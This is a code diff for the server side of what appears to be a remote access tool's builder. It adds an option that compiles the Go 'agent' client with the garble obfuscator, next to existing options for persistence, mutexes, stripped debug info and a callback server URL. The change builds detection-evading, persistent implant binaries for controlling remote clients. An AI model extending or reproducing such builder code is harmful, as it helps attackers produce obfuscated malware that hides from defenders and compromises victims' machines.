@@ -462,6 +462,7 @@ async function startBuildProcess(
     disableMutex?: boolean;
     stripDebug?: boolean;
     disableCgo?: boolean;
+    obfuscate?: boolean;
     enablePersistence?: boolean;
   }
 ) {
@@ -606,13 +607,22 @@ async function startBuildProcess(
         sendToStream({ type: "output", text: `Persistence enabled for ${platform}\n`, level: "info" });
       }
 
+      if (config.obfuscate) {
+        sendToStream({ type: "output", text: `Obfuscation enabled (garble)\n`, level: "info" });
+      }
+
       try {
-        logger.info(`[build:${buildId.substring(0, 8)}] Building: go build ${ldflags ? `-ldflags="${ldflags}" ` : ""}-o ${outDir}/${outputName} ./cmd/agent`);
+        const buildTool = config.obfuscate ? "garble" : "go";
+        logger.info(`[build:${buildId.substring(0, 8)}] Building: ${buildTool} build ${ldflags ? `-ldflags="${ldflags}" ` : ""}-o ${outDir}/${outputName} ./cmd/agent`);
         logger.info(`[build:${buildId.substring(0, 8)}] Environment: GOOS=${os} GOARCH=${actualArch} CGO_ENABLED=${env.CGO_ENABLED}`);
 
-        const buildCmd = ldflags
-          ? $`go build -ldflags=${ldflags} -o ${outDir}/${outputName} ./cmd/agent`
-          : $`go build -o ${outDir}/${outputName} ./cmd/agent`;
+        const buildCmd = config.obfuscate
+          ? (ldflags
+              ? $`garble build -ldflags=${ldflags} -o ${outDir}/${outputName} ./cmd/agent`
+              : $`garble build -o ${outDir}/${outputName} ./cmd/agent`)
+          : (ldflags
+              ? $`go build -ldflags=${ldflags} -o ${outDir}/${outputName} ./cmd/agent`
+              : $`go build -o ${outDir}/${outputName} ./cmd/agent`);
 
         const proc = buildCmd.env(env).cwd(clientDir).nothrow();
 
@@ -1808,7 +1818,7 @@ async function startServer() {
             requirePermission(user, "clients:control");
             
             const body = await req.json();
-            const { platforms, serverUrl, customId, countryCode, stripDebug, disableCgo, enablePersistence, mutex, disableMutex } = body;
+            const { platforms, serverUrl, customId, countryCode, stripDebug, disableCgo, obfuscate, enablePersistence, mutex, disableMutex } = body;
             
             if (!platforms || !Array.isArray(platforms) || platforms.length === 0) {
               return Response.json({ error: "No platforms specified" }, { status: 400 });
@@ -1842,7 +1852,7 @@ async function startServer() {
             });
             
             
-            startBuildProcess(buildId, { platforms: sanitizedPlatforms, serverUrl, customId: safeCustomId, countryCode: safeCountry, mutex: safeMutex, disableMutex: safeDisableMutex, stripDebug, disableCgo, enablePersistence });
+            startBuildProcess(buildId, { platforms: sanitizedPlatforms, serverUrl, customId: safeCustomId, countryCode: safeCountry, mutex: safeMutex, disableMutex: safeDisableMutex, stripDebug, disableCgo, obfuscate: !!obfuscate, enablePersistence });
             
             return Response.json({ buildId });
           }
